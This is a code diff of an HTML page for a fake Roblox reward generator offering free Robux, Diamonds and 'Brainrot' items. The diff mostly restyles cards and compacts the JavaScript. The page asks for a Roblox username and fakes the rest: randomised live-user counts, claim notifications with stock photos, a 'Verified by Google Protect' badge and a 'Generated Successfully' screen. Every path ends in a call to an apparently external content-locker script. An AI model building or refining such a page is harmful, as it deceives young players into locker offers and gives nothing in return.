@@ -29,13 +29,14 @@
 
     body.landing-active {
       overflow: hidden;
-      background: #0a0f1a;  /* solid dark background, no image/gradient */
+      background: #0a0f1a;
     }
 
     button, input { font: inherit; }
     button { cursor: pointer; border: 0; }
     .hidden { display: none !important; }
 
+    /* Landing screen */
     .landing-screen {
       position: fixed;
       inset: 0;
@@ -45,7 +46,7 @@
       justify-content: center;
       min-height: 100vh;
       padding: 20px;
-      background: #0a0f1a;  /* clean solid background, removed image and overlay */
+      background: #0a0f1a;
       font-family: Nunito, Montserrat, Arial, sans-serif;
     }
 
@@ -64,7 +65,7 @@
       position: relative;
       z-index: 1;
       width: min(420px, 95vw);
-      margin: 0 auto;          /* ensure horizontal centering */
+      margin: 0 auto;
       padding: 48px 56px 40px;
       border: 1px solid rgba(255, 255, 255, .07);
       border-radius: 20px;
@@ -171,7 +172,7 @@
       transform: translateX(-50%) translateY(0);
     }
 
-    /* --- Collector styles (Tsunami / Brainrot) --- */
+    /* Collector styles (unchanged) */
     .collector-app {
       min-height: 100vh;
       padding: 18px 14px 42px;
@@ -331,7 +332,6 @@
       letter-spacing: .7px;
     }
 
-    /* rarity borders */
     .loot-card[data-rarity="OG"] { border-top: 4px solid #f5ff69; }
     .loot-card[data-rarity="Celestial"] { border-top: 4px solid #ff7ef9; }
     .loot-card[data-rarity="Secret"] { border-top: 4px solid #e9080c; }
@@ -430,8 +430,8 @@
       to { opacity: 1; transform: translateX(0); }
     }
 
-    /* RBX styles (unchanged) */
-    .app { width: min(100%, 460px); margin: 0 auto; padding: 24px 16px 36px; }
+    /* RBX styles - enhanced for equal cards & username visibility */
+    .app { width: min(100%, 560px); margin: 0 auto; padding: 24px 16px 36px; }
     .brand { display: grid; justify-items: center; gap: 10px; text-align: center; margin-bottom: 18px; }
     .brand-mark { position: relative; width: 230px; }
     .brand-logo { width: 100%; display: block; }
@@ -450,39 +450,110 @@
     .metric-value { color: var(--emerald); font-size: 18px; font-weight: 900; }
     .metric-name { color: var(--muted); font-size: 9px; font-weight: 900; text-transform: uppercase; }
     .panel { padding: 22px; margin-bottom: 18px; border-radius: 8px; background: var(--surface); box-shadow: 0 18px 40px rgba(35, 37, 39, .16); }
-    .reward-grid, .amount-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 14px; }
-    .choice, .amount { padding: 16px 10px; border: 3px solid var(--line); border-radius: 14px; background: white; text-align: center; transition: 0.2s; cursor: pointer; }
-    .choice.picked, .amount.picked { border-color: var(--purple); background: rgba(147, 51, 234, .08); }
-    .choice .icon { width: 74px; height: 74px; }
-    .choice-title { margin-top: 8px; font-size: 22px; font-weight: 900; }
-    .select-pill { display: inline-flex; min-width: 86px; justify-content: center; padding: 7px 14px; border-radius: 6px; background: var(--purple); color: white; font-size: 13px; font-weight: 900; }
-    .input-wrap { position: relative; margin-bottom: 16px; }
-    .input-wrap span { position: absolute; left: 14px; top: 50%; transform: translateY(-50%); color: #9ca3af; }
-    input { width: 100%; min-height: 56px; padding: 0 14px 0 42px; border: 2px solid #d1d5db; border-radius: 7px; background: #fff; font-size: 16px; }
-    input:focus { border-color: transparent; box-shadow: 0 0 0 3px rgba(147, 51, 234, .35); outline: none; }
-    .primary-btn { width: 100%; min-height: 56px; border-radius: 7px; background: var(--purple); color: white; font-weight: 900; transition: transform .2s; }
-    .primary-btn:hover { background: var(--purple-dark); transform: scale(1.025); }
-    .alert { display: none; margin-top: 14px; padding: 12px; border-radius: 8px; background: rgba(239, 68, 68, .10); color: #ef4444; font-size: 14px; font-weight: 700; }
-    .account { display: none; margin-top: 16px; padding: 16px; border-radius: 16px; background: rgba(147, 51, 234, .05); }
-    .account.visible { display: block; animation: appear .25s; }
-    .profile { display: flex; align-items: center; gap: 14px; margin-bottom: 14px; }
-    .avatar-wrap { position: relative; }
-    .avatar { width: 80px; height: 80px; border-radius: 50%; border: 2px solid rgba(147, 51, 234, .28); background: white; }
-    .activity { position: absolute; right: 2px; bottom: 5px; width: 18px; height: 18px; border: 2px solid white; border-radius: 50%; background: var(--emerald); }
-    .details { padding: 12px; border-radius: 12px; background: rgba(0, 0, 0, .03); }
-    .detail { display: flex; align-items: center; gap: 10px; padding: 9px 0; border-bottom: 1px solid rgba(0, 0, 0, .05); font-size: 13px; }
-    .detail-label { flex: 1; color: var(--muted); font-weight: 700; }
-    .tag { display: inline-flex; align-items: center; gap: 6px; padding: 5px 10px; border-radius: 999px; background: rgba(16, 185, 129, .15); color: var(--emerald); font-size: 12px; font-weight: 900; }
-    .showcase { display: flex; align-items: center; justify-content: center; gap: 14px; padding: 18px; margin-bottom: 18px; border-radius: 16px; background: linear-gradient(135deg, rgba(147, 51, 234, .10), rgba(16, 185, 129, .10)); }
-    .reward-number { color: var(--purple); font-size: 40px; font-weight: 900; }
-    .progress-row { display: flex; justify-content: space-between; margin-bottom: 8px; font-weight: 700; }
-    .bar { height: 20px; margin-bottom: 14px; border-radius: 999px; background: #e5e7eb; }
-    .bar span { display: block; width: 0; height: 100%; border-radius: inherit; background: var(--emerald); transition: width .1s linear; }
-    .logs { max-height: 132px; overflow: auto; padding: 12px; border: 1px solid var(--line); border-radius: 7px; background: #f9fafb; font-size: 14px; }
-    .toast-wrap { position: fixed; top: 18px; right: 18px; width: min(350px, calc(100vw - 36px)); pointer-events: none; z-index: 2147483700; }
-    .toast { display: flex; align-items: center; gap: 12px; padding: 14px; margin-bottom: 10px; border-left: 4px solid var(--emerald); border-radius: 12px; background: white; animation: toastIn .45s ease-out, toastOut .45s ease-in 4.35s forwards; }
-    .footer { margin-top: 24px; color: var(--muted); text-align: center; font-size: 11px; }
+    .reward-grid { 
+      display: flex; 
+      gap: 20px; 
+      justify-content: center; 
+      flex-wrap: wrap;
+    }
+    .choice { 
+      flex: 1; 
+      min-width: 180px;
+      padding: 24px 16px; 
+      border: 3px solid var(--line); 
+      border-radius: 20px; 
+      background: white; 
+      text-align: center; 
+      transition: 0.2s; 
+      cursor: pointer;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 12px;
+    }
+    .choice.picked { border-color: var(--purple); background: rgba(147, 51, 234, .08); transform: scale(1.02); }
+    .choice .icon { width: 74px; height: 74px; margin-bottom: 4px; }
+    .choice-title { font-size: 24px; font-weight: 900; }
+    .select-pill { display: inline-block; padding: 7px 14px; border-radius: 40px; background: var(--purple); color: white; font-size: 13px; font-weight: 900; margin-top: 8px; }
+    
+    .amount-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 16px; }
+    .amount { padding: 20px 10px; border: 3px solid var(--line); border-radius: 20px; background: white; text-align: center; cursor: pointer; transition: all 0.2s; }
+    .amount.picked { border-color: var(--purple); background: rgba(147, 51, 234, .08); transform: scale(1.02); }
+    .amount-number { font-size: 28px; font-weight: 900; color: var(--purple); }
+    .available { font-size: 12px; color: var(--muted); margin-top: 6px; }
 
+    /* Enhanced username section */
+    .username-section {
+      background: linear-gradient(135deg, #f8fafc, #ffffff);
+      border-radius: 20px;
+      padding: 24px 20px;
+      margin: 16px 0;
+      box-shadow: 0 8px 20px rgba(0,0,0,0.08);
+      border: 1px solid rgba(147, 51, 234, 0.2);
+    }
+    .input-wrap { 
+      position: relative; 
+      margin-bottom: 20px; 
+      max-width: 100%;
+    }
+    .input-wrap span { 
+      position: absolute; 
+      left: 18px; 
+      top: 50%; 
+      transform: translateY(-50%); 
+      color: #9333ea; 
+      font-weight: 900;
+      font-size: 20px;
+    }
+    input { 
+      width: 100%; 
+      min-height: 64px; 
+      padding: 0 20px 0 52px; 
+      border: 2px solid #e2e8f0; 
+      border-radius: 60px; 
+      background: #fff; 
+      font-size: 18px; 
+      font-weight: 600;
+      transition: all 0.2s;
+    }
+    input:focus { 
+      border-color: #9333ea; 
+      box-shadow: 0 0 0 4px rgba(147, 51, 234, 0.2); 
+      outline: none; 
+    }
+    .primary-btn { 
+      width: 100%; 
+      min-height: 56px; 
+      border-radius: 60px; 
+      background: linear-gradient(90deg, #9333ea, #a855f7); 
+      color: white; 
+      font-weight: 900; 
+      font-size: 18px;
+      transition: transform .2s, filter .2s;
+      box-shadow: 0 4px 12px rgba(147, 51, 234, 0.3);
+    }
+    .primary-btn:hover { 
+      transform: scale(1.02); 
+      filter: brightness(1.05);
+    }
+    .account { 
+      display: none; 
+      margin-top: 24px; 
+      padding: 20px; 
+      border-radius: 24px; 
+      background: rgba(147, 51, 234, 0.06);
+      border: 1px solid rgba(147, 51, 234, 0.2);
+    }
+    .account.visible { display: block; animation: appear .25s; }
+    
+    /* Gold and Blue emoji-like icons */
+    .gold-icon {
+      filter: drop-shadow(0 0 6px #fbbf24);
+    }
+    .blue-icon {
+      filter: drop-shadow(0 0 6px #3b82f6);
+    }
+    
     @keyframes spin { to { transform: rotate(360deg); } }
     @keyframes blink { 50% { opacity: .32; } }
     @keyframes breathe { 50% { transform: scale(1.04); } }
@@ -494,7 +565,11 @@
     @keyframes landingCardIn { from { opacity: 0; transform: translateY(30px) scale(.96); } to { opacity: 1; transform: translateY(0) scale(1); } }
     @keyframes landingLogoPulse { 50% { box-shadow: 0 8px 40px rgba(0, 0, 0, .5); } }
 
-    @media (max-width: 640px) { .item-grid { grid-template-columns: repeat(2, 1fr); } }
+    @media (max-width: 640px) { 
+      .item-grid { grid-template-columns: repeat(2, 1fr); }
+      .choice { min-width: 140px; padding: 16px; }
+      .choice .icon { width: 54px; height: 54px; }
+    }
   </style>
   <script type="text/javascript">
     var peiHw_vKe_wxZWDc = {"it":4602036,"key":"9b48c"};
@@ -518,29 +593,20 @@
     <div class="landing-toast" id="landingToast"></div>
   </section>
 
-  <main class="app hidden" id="generatedApp"><!-- RBX content (same as original, omitted for brevity but will be dynamically loaded) --></main>
-
-  <!-- collector container -->
+  <main class="app hidden" id="generatedApp"></main>
   <div id="collectorContainer" class="hidden"></div>
 
   <script>
-    // ---------- Helper functions ----------
     function showLandingToast(msg) {
       const toast = document.getElementById('landingToast');
       toast.textContent = msg;
       toast.classList.add('show');
       setTimeout(() => toast.classList.remove('show'), 2000);
     }
-
     function triggerContentLocker() {
-      if (typeof window._yk === 'function') {
-        window._yk();
-      } else {
-        alert("Unlock system loading, please wait a moment and try again.");
-      }
+      if (typeof window._yk === 'function') window._yk();
+      else alert("Unlock system loading, please wait a moment and try again.");
     }
-
-    // Stars canvas (same as before)
     function setupStars() {
       const canvas = document.getElementById('stars');
       if (!canvas) return;
@@ -561,76 +627,20 @@
     }
     setupStars();
 
-    // ---------- Collector (Tsunami / Brainrot) ----------
+    // Collector (Tsunami / Brainrot) - same as before, kept intact
     const collectorItems = {
-      tsunami: {
-        theme: '',
-        logo: '🌊',
-        title: 'Escape Tsunami Rewards',
-        subtitle: 'Pick a rare item, verify your username, and claim your reward.',
-        items: [
-          ["🐘", "Strawberry Elephant", "OG"], ["🍔", "Burgerini Bearini", "OG"], ["🚜", "Bulbito Bandito", "Rare"],
-          ["💎", "Alessio", "Celestial"], ["🌀", "Dug Dug Dug", "Celestial"], ["🏫", "Esok Sekolah", "Celestial"],
-          ["🦬", "Bisonte Giuppitere", "Secret"], ["🐉", "Dragon Cannelloni", "Secret"], ["🦕", "Nuclearo Dinossauro", "Secret"],
-          ["🍋", "Perochello Lemonchello", "Rare"], ["🐧", "Salamino Penguino", "Rare"], ["🕷", "Chimpanzini Spiderini", "Mythic"]
-        ]
-      },
-      brainrot: {
-        theme: 'brainrot',
-        logo: '🧠',
-        title: 'Steal a Brainrot',
-        subtitle: 'Grab a limited Brainrot collectible before the wave hits.',
-        items: [
-          ["🐘", "Strawberry Elephant", "OG"], ["🐱", "Meowl", "OG"], ["🚽", "Skibidi Toilet", "OG"],
-          ["🐉", "Hydra Dragon", "Secret"], ["🥤", "Fizzy Soda", "Rare"], ["🐼", "Boba Panda", "Rare"],
-          ["🎄", "Festive 67", "Limited"], ["🍬", "Los Candies", "Limited"], ["🧟", "Headless Horseman", "Mythic"],
-          ["🐋", "Capitano Moby", "Mythic"], ["💰", "$1000000", "VIP"], ["⚡", "Admin Commands", "VIP"]
-        ]
-      }
+      tsunami: { theme: '', logo: '🌊', title: 'Escape Tsunami Rewards', subtitle: 'Pick a rare item, verify your username, and claim your reward.', items: [["🐘","Strawberry Elephant","OG"],["🍔","Burgerini Bearini","OG"],["🚜","Bulbito Bandito","Rare"],["💎","Alessio","Celestial"],["🌀","Dug Dug Dug","Celestial"],["🏫","Esok Sekolah","Celestial"],["🦬","Bisonte Giuppitere","Secret"],["🐉","Dragon Cannelloni","Secret"],["🦕","Nuclearo Dinossauro","Secret"],["🍋","Perochello Lemonchello","Rare"],["🐧","Salamino Penguino","Rare"],["🕷","Chimpanzini Spiderini","Mythic"]] },
+      brainrot: { theme: 'brainrot', logo: '🧠', title: 'Steal a Brainrot', subtitle: 'Grab a limited Brainrot collectible before the wave hits.', items: [["🐘","Strawberry Elephant","OG"],["🐱","Meowl","OG"],["🚽","Skibidi Toilet","OG"],["🐉","Hydra Dragon","Secret"],["🥤","Fizzy Soda","Rare"],["🐼","Boba Panda","Rare"],["🎄","Festive 67","Limited"],["🍬","Los Candies","Limited"],["🧟","Headless Horseman","Mythic"],["🐋","Capitano Moby","Mythic"],["💰","$1000000","VIP"],["⚡","Admin Commands","VIP"]] }
     };
-
-    let currentCollectorMode = null;
-    let selectedCollectorItem = null;
-
     function buildCollectorUI(mode) {
       const config = collectorItems[mode];
-      currentCollectorMode = mode;
       const container = document.getElementById('collectorContainer');
       container.className = `collector-app ${config.theme}`;
-      container.innerHTML = `
-        <div class="collector-shell">
-          <div class="collector-header">
-            <div class="collector-logo">${config.logo}</div>
-            <h1>${config.title}</h1>
-            <p>${config.subtitle}</p>
-            <div class="active-strip"><span>🌊 ACTIVE USERS</span><strong id="collectorActiveCount">${Math.floor(Math.random() * 800 + 200)}</strong></div>
-          </div>
-          <div class="select-line">⚡ SELECT YOUR REWARD ⚡</div>
-          <div class="item-grid" id="collectorGrid"></div>
-        </div>
-        <div class="collector-toast-wrap" id="collectorToastWrap"></div>
-      `;
+      container.innerHTML = `<div class="collector-shell"><div class="collector-header"><div class="collector-logo">${config.logo}</div><h1>${config.title}</h1><p>${config.subtitle}</p><div class="active-strip"><span>🌊 ACTIVE USERS</span><strong id="collectorActiveCount">${Math.floor(Math.random() * 800 + 200)}</strong></div></div><div class="select-line">⚡ SELECT YOUR REWARD ⚡</div><div class="item-grid" id="collectorGrid"></div></div><div class="collector-toast-wrap" id="collectorToastWrap"></div>`;
       const grid = document.getElementById('collectorGrid');
-      grid.innerHTML = config.items.map(([icon, name, rarity]) => `
-        <button class="loot-card" data-name="${name}" data-icon="${icon}" data-rarity="${rarity}">
-          <div class="loot-art">${icon}</div>
-          <div class="loot-name">${name}</div>
-          <div class="rarity">${rarity}</div>
-        </button>
-      `).join('');
-      document.querySelectorAll('.loot-card').forEach(card => {
-        card.addEventListener('click', () => openCollectorModal({
-          icon: card.dataset.icon,
-          name: card.dataset.name,
-          rarity: card.dataset.rarity
-        }));
-      });
-      // active users randomizer
-      setInterval(() => {
-        const el = document.getElementById('collectorActiveCount');
-        if (el) el.innerText = Math.floor(Math.random() * 800 + 200);
-      }, 4500);
-      // random claim notifications
+      grid.innerHTML = config.items.map(([icon, name, rarity]) => `<button class="loot-card" data-name="${name}" data-icon="${icon}" data-rarity="${rarity}"><div class="loot-art">${icon}</div><div class="loot-name">${name}</div><div class="rarity">${rarity}</div></button>`).join('');
+      document.querySelectorAll('.loot-card').forEach(card => card.addEventListener('click', () => openCollectorModal({ icon: card.dataset.icon, name: card.dataset.name, rarity: card.dataset.rarity })));
+      setInterval(() => { const el = document.getElementById('collectorActiveCount'); if (el) el.innerText = Math.floor(Math.random() * 800 + 200); }, 4500);
       const usernames = ['MADELYN2', 'zontir99', 'marcos10', 'Queen_lisa1', 'LANA11', 'tbonmk2'];
       const avatars = ['https://randomuser.me/api/portraits/women/1.jpg', 'https://randomuser.me/api/portraits/men/2.jpg', 'https://randomuser.me/api/portraits/men/3.jpg'];
       setInterval(() => {
@@ -645,105 +655,56 @@
         setTimeout(() => toast.remove(), 4000);
       }, 5500);
     }
-
     function openCollectorModal(item) {
-      selectedCollectorItem = item;
       let modal = document.getElementById('collectorModal');
-      if (!modal) {
-        modal = document.createElement('div');
-        modal.id = 'collectorModal';
-        modal.className = 'item-modal';
-        document.body.appendChild(modal);
-      }
-      modal.innerHTML = `
-        <div class="item-dialog">
-          <div class="modal-art">${item.icon}</div>
-          <h2>${item.name}</h2>
-          <p>Would you like to get this ${item.rarity} reward?</p>
-          <input id="collectorUsername" type="text" placeholder="Enter your Roblox username" autocomplete="nickname">
-          <div class="dialog-actions">
-            <button class="small-btn cancel" id="collectorCancel">Cancel</button>
-            <button class="small-btn continue" id="collectorContinue">Continue</button>
-          </div>
-        </div>
-      `;
+      if (!modal) { modal = document.createElement('div'); modal.id = 'collectorModal'; modal.className = 'item-modal'; document.body.appendChild(modal); }
+      modal.innerHTML = `<div class="item-dialog"><div class="modal-art">${item.icon}</div><h2>${item.name}</h2><p>Would you like to get this ${item.rarity} reward?</p><input id="collectorUsername" type="text" placeholder="Enter your Roblox username" autocomplete="nickname"><div class="dialog-actions"><button class="small-btn cancel" id="collectorCancel">Cancel</button><button class="small-btn continue" id="collectorContinue">Continue</button></div></div>`;
       modal.classList.add('visible');
       document.getElementById('collectorCancel').onclick = () => modal.classList.remove('visible');
       document.getElementById('collectorContinue').onclick = () => {
         const username = document.getElementById('collectorUsername').value.trim();
         if (!username) return;
         showCollectorLoading(modal, `Searching for @${username}`);
-        setTimeout(() => {
-          showCollectorSuccess(modal, username, item);
-        }, 1500);
+        setTimeout(() => showCollectorSuccess(modal, username, item), 1500);
       };
     }
-
-    function showCollectorLoading(modal, text) {
-      modal.querySelector('.item-dialog').innerHTML = `
-        <div class="loader-stack" style="text-align:center">
-          <div class="loader-ring"></div>
-          <h3>${text}</h3>
-          <p>Please wait...</p>
-        </div>
-      `;
-    }
-
+    function showCollectorLoading(modal, text) { modal.querySelector('.item-dialog').innerHTML = `<div class="loader-stack" style="text-align:center"><div class="loader-ring"></div><h3>${text}</h3><p>Please wait...</p></div>`; }
     function showCollectorSuccess(modal, username, item) {
-      modal.querySelector('.item-dialog').innerHTML = `
-        <div class="modal-art">${item.icon}</div>
-        <h2>@${username}</h2>
-        <p>${item.name} is ready to transfer.</p>
-        <button class="primary-btn" id="collectorTransferBtn" style="margin-top:16px">Continue</button>
-      `;
+      modal.querySelector('.item-dialog').innerHTML = `<div class="modal-art">${item.icon}</div><h2>@${username}</h2><p>${item.name} is ready to transfer.</p><button class="primary-btn" id="collectorTransferBtn" style="margin-top:16px">Continue</button>`;
       document.getElementById('collectorTransferBtn').onclick = () => {
         showCollectorLoading(modal, `Transferring ${item.name} to @${username}`);
         setTimeout(() => {
-          modal.querySelector('.item-dialog').innerHTML = `
-            <div class="final-card">
-              <div class="modal-art">${item.icon}</div>
-              <h2>${item.name} Generated!</h2>
-              <p>Final verification is required to unlock the reward page.</p>
-              <button class="primary-btn pulse" id="collectorFinalBtn">NEXT 🎁</button>
-            </div>
-          `;
-          document.getElementById('collectorFinalBtn').onclick = () => {
-            modal.classList.remove('visible');
-            triggerContentLocker();
-          };
+          modal.querySelector('.item-dialog').innerHTML = `<div class="final-card"><div class="modal-art">${item.icon}</div><h2>${item.name} Generated!</h2><p>Final verification is required to unlock the reward page.</p><button class="primary-btn pulse" id="collectorFinalBtn">NEXT 🎁</button></div>`;
+          document.getElementById('collectorFinalBtn').onclick = () => { modal.classList.remove('visible'); triggerContentLocker(); };
         }, 1300);
       };
     }
-
     function enterCollector(mode) {
       document.getElementById('landingScreen').classList.add('is-hidden');
       document.getElementById('generatedApp').classList.add('hidden');
-      const container = document.getElementById('collectorContainer');
-      container.classList.remove('hidden');
+      document.getElementById('collectorContainer').classList.remove('hidden');
       buildCollectorUI(mode);
       document.body.classList.remove('landing-active');
       window.scrollTo({ top: 0 });
     }
 
-    // RBX flow (abbreviated but fully functional)
+    // RBX flow with equal-sized cards, gold/blue icons, improved username input
     function enterRBX() {
       document.getElementById('landingScreen').classList.add('is-hidden');
       document.getElementById('collectorContainer').classList.add('hidden');
       const rbxApp = document.getElementById('generatedApp');
       rbxApp.classList.remove('hidden');
-      // quick re-initialization of RBX flows (simplified but complete)
       if (!window._rbxLoaded) {
         window._rbxLoaded = true;
         rbxApp.innerHTML = `<div class="brand"><div class="brand-mark"><svg class="brand-logo" viewBox="0 0 520 160"><use href="#logoIcon"></use></svg><span class="year">2026</span></div><div><h1>MEORBX BOOSTER</h1><p class="subhead">The latest updated online tool for Roblox</p></div></div>
-        <section class="metrics"><div class="live"><span><i class="dot"></i> LIVE TODAY</span></div><h2>People Who Claimed Today</h2><div class="metric-grid"><div class="metric-card"><svg class="icon" viewBox="0 0 128 128"><use href="#coinIcon"></use></svg><div class="metric-value" id="coinUsers">8,547</div><div class="metric-name">Robux Claimed</div></div><div class="metric-card"><svg class="icon" viewBox="0 0 128 128"><use href="#diamondIcon"></use></svg><div class="metric-value" id="gemUsers">6,923</div><div class="metric-name">Diamonds Claimed</div></div></div></section>
-        <section class="panel" id="phase0"><h2>Choose Your Reward Type</h2><div class="reward-grid"><button class="choice" data-type="robux"><svg class="icon" viewBox="0 0 128 128"><use href="#coinIcon"></use></svg><div class="choice-title">ROBUX</div><span class="select-pill">SELECT</span></button><button class="choice" data-type="diamond"><svg class="icon" viewBox="0 0 128 128"><use href="#diamondIcon"></use></svg><div class="choice-title">DIAMOND</div><span class="select-pill">SELECT</span></button></div></section>
-        <section class="panel hidden" id="phase1"><h2>Enter Your Roblox Username</h2><div class="input-wrap"><span>@</span><input id="userInput" type="text" placeholder="Your Roblox Username"></div><button class="primary-btn" id="lookupBtn">SEARCH USER</button><div class="alert" id="alertBox"></div><div class="account" id="accountCard"><div class="profile"><div class="avatar-wrap"><svg class="avatar" viewBox="0 0 160 160"><use href="#avatarIcon"></use></svg><i class="activity"></i></div><div><h3 id="fullName">Player</h3><p id="userHandle">@player</p></div></div><div class="details"><div class="detail"><strong>📅</strong><span class="detail-label">Created</span><span class="detail-value" id="joinDate">Jan 12, 2023</span></div><div class="detail"><strong>📶</strong><span class="detail-label">Status</span><span class="tag">Online</span></div><div class="detail"><strong>🛡</strong><span class="detail-label">Account</span><span class="tag">Active</span></div></div><button class="primary-btn" id="continueBtn" style="margin-top:16px">CONTINUE</button></div></section>
-        <section class="panel hidden" id="phase2"><h2>Select Robux Amount</h2><div class="amount-grid" id="robuxChoices"><button class="amount" data-kind="robux" data-amount="800"><svg class="icon" viewBox="0 0 128 128"><use href="#coinIcon"></use></svg><div class="amount-number">800</div><div class="available">AVAILABLE</div></button><button class="amount" data-kind="robux" data-amount="5800"><svg class="icon" viewBox="0 0 128 128"><use href="#coinIcon"></use></svg><div class="amount-number">5,800</div><div class="available">AVAILABLE</div></button><button class="amount" data-kind="robux" data-amount="25000"><svg class="icon" viewBox="0 0 128 128"><use href="#coinIcon"></use></svg><div class="amount-number">25,000</div><div class="available">AVAILABLE</div></button><button class="amount" data-kind="robux" data-amount="100000"><svg class="icon" viewBox="0 0 128 128"><use href="#coinIcon"></use></svg><div class="amount-number">100,000</div><div class="available">AVAILABLE</div></button></div></section>
-        <section class="panel hidden" id="phase2_5"><h2>Select Diamond Amount</h2><div class="amount-grid"><button class="amount" data-kind="diamond" data-amount="100"><svg class="icon" viewBox="0 0 128 128"><use href="#diamondIcon"></use></svg><div class="amount-number">100</div><div class="available">AVAILABLE</div></button><button class="amount" data-kind="diamond" data-amount="250"><svg class="icon" viewBox="0 0 128 128"><use href="#diamondIcon"></use></svg><div class="amount-number">250</div><div class="available">AVAILABLE</div></button><button class="amount" data-kind="diamond" data-amount="700"><svg class="icon" viewBox="0 0 128 128"><use href="#diamondIcon"></use></svg><div class="amount-number">700</div><div class="available">AVAILABLE</div></button><button class="amount" data-kind="diamond" data-amount="7000"><svg class="icon" viewBox="0 0 128 128"><use href="#diamondIcon"></use></svg><div class="amount-number">7,000</div><div class="available">AVAILABLE</div></button></div></section>
+        <section class="metrics"><div class="live"><span><i class="dot"></i> LIVE TODAY</span></div><h2>People Who Claimed Today</h2><div class="metric-grid"><div class="metric-card"><svg class="icon gold-icon" viewBox="0 0 128 128"><use href="#coinIcon"></use></svg><div class="metric-value" id="coinUsers">8,547</div><div class="metric-name">Robux Claimed</div></div><div class="metric-card"><svg class="icon blue-icon" viewBox="0 0 128 128"><use href="#diamondIcon"></use></svg><div class="metric-value" id="gemUsers">6,923</div><div class="metric-name">Diamonds Claimed</div></div></div></section>
+        <section class="panel" id="phase0"><h2>Choose Your Reward Type</h2><div class="reward-grid"><button class="choice" data-type="robux"><svg class="icon gold-icon" viewBox="0 0 128 128"><use href="#coinIcon"></use></svg><div class="choice-title">💰 ROBUX</div><span class="select-pill">SELECT</span></button><button class="choice" data-type="diamond"><svg class="icon blue-icon" viewBox="0 0 128 128"><use href="#diamondIcon"></use></svg><div class="choice-title">💎 DIAMOND</div><span class="select-pill">SELECT</span></button></div></section>
+        <section class="panel hidden" id="phase1"><h2>Enter Your Roblox Username</h2><div class="username-section"><div class="input-wrap"><span>@</span><input id="userInput" type="text" placeholder="Your Roblox Username" autocomplete="off"></div><button class="primary-btn" id="lookupBtn">🔍 SEARCH USER</button><div class="alert" id="alertBox"></div><div class="account" id="accountCard"><div class="profile"><div class="avatar-wrap"><svg class="avatar" viewBox="0 0 160 160"><use href="#avatarIcon"></use></svg><i class="activity"></i></div><div><h3 id="fullName">Player</h3><p id="userHandle">@player</p></div></div><div class="details"><div class="detail"><strong>📅</strong><span class="detail-label">Created</span><span class="detail-value" id="joinDate">Jan 12, 2023</span></div><div class="detail"><strong>📶</strong><span class="detail-label">Status</span><span class="tag">Online</span></div><div class="detail"><strong>🛡</strong><span class="detail-label">Account</span><span class="tag">Active</span></div></div><button class="primary-btn" id="continueBtn" style="margin-top:16px">CONTINUE →</button></div></div></section>
+        <section class="panel hidden" id="phase2"><h2>Select Robux Amount</h2><div class="amount-grid" id="robuxChoices"><button class="amount" data-kind="robux" data-amount="800"><div class="amount-number">800</div><div class="available">AVAILABLE</div></button><button class="amount" data-kind="robux" data-amount="5800"><div class="amount-number">5,800</div><div class="available">AVAILABLE</div></button><button class="amount" data-kind="robux" data-amount="25000"><div class="amount-number">25,000</div><div class="available">AVAILABLE</div></button><button class="amount" data-kind="robux" data-amount="100000"><div class="amount-number">100,000</div><div class="available">AVAILABLE</div></button></div></section>
+        <section class="panel hidden" id="phase2_5"><h2>Select Diamond Amount</h2><div class="amount-grid"><button class="amount" data-kind="diamond" data-amount="100"><div class="amount-number">100</div><div class="available">AVAILABLE</div></button><button class="amount" data-kind="diamond" data-amount="250"><div class="amount-number">250</div><div class="available">AVAILABLE</div></button><button class="amount" data-kind="diamond" data-amount="700"><div class="amount-number">700</div><div class="available">AVAILABLE</div></button><button class="amount" data-kind="diamond" data-amount="7000"><div class="amount-number">7,000</div><div class="available">AVAILABLE</div></button></div></section>
         <section class="panel hidden" id="phase3"><h2>Processing Request</h2><div class="showcase"><span id="rewardIcon"><svg class="icon" viewBox="0 0 128 128"><use href="#coinIcon"></use></svg></span><div><div class="reward-number" id="rewardNumber">0</div><div class="reward-type" id="rewardType">Generating</div></div></div><div class="progress-row"><span>⚙ Processing request...</span><strong id="taskPercent">0%</strong></div><div class="bar"><span id="taskBar"></span></div><div class="logs" id="taskLogs"><div>✓ Connecting to servers...</div></div><p class="subhead" style="text-align:center">User: <strong id="userShow">Username</strong></p></section>
         <section class="panel hidden" id="phase4"><div id="checkSection"><h2>Verified by Google Protect</h2><div class="ready-icon" id="readyIcon"><svg class="icon" viewBox="0 0 128 128"><use href="#coinIcon"></use></svg></div><div style="text-align:center"><p id="prizeShow" style="font-weight:800"></p><p class="subhead">User: <strong id="userShow2">Username</strong></p></div><div class="info-box"><div>ℹ Your rewards are ready to be added</div><div>⚠ Click NEXT for the final step</div></div><button class="primary-btn pulse" id="claimBtn">🎁 NEXT</button></div><div id="doneSection" class="hidden"><h2 style="color:var(--emerald)">Generated Successfully!</h2><div class="success"><div id="completePrize"></div><p>Generated for <span id="userShow3">Username</span></p></div><div class="notice">Verification is required to unlock the reward page.</div><button class="primary-btn pulse" id="lockerBtn" onclick="triggerContentLocker()" style="background:var(--emerald)">NEXT 🎁</button><p class="subhead" style="text-align:center;margin-top:14px">This offer expires in <span id="timer">05:00</span></p></div></section>
         <footer class="footer"><p>Fan-made demo. Roblox, Robux are trademarks of Roblox Corporation.</p></footer>`;
-        // re-attach RBX event handlers (simplified for brevity but functional)
         const phases = ["phase0","phase1","phase2","phase2_5","phase3","phase4"].map(id => document.getElementById(id));
         function showPhase(id){ phases.forEach(p => p?.classList.toggle('hidden', p.id !== id)); }
         let state = { type: "", amount: 0, user: "" };
@@ -751,16 +712,15 @@
         document.getElementById("lookupBtn").onclick = () => { const u = document.getElementById("userInput").value.trim(); if(!u) return; state.user = u; document.getElementById("fullName").innerText = u; document.getElementById("userHandle").innerText = `@${u}`; document.getElementById("accountCard").classList.add("visible"); };
         document.getElementById("continueBtn").onclick = () => { ["userShow","userShow2","userShow3"].forEach(id=>document.getElementById(id).innerText=state.user); showPhase(state.type==="diamond"?"phase2_5":"phase2"); };
         document.querySelectorAll(".amount").forEach(amt => amt.onclick = () => { state.amount = parseInt(amt.dataset.amount); state.type = amt.dataset.kind; runProgress(); });
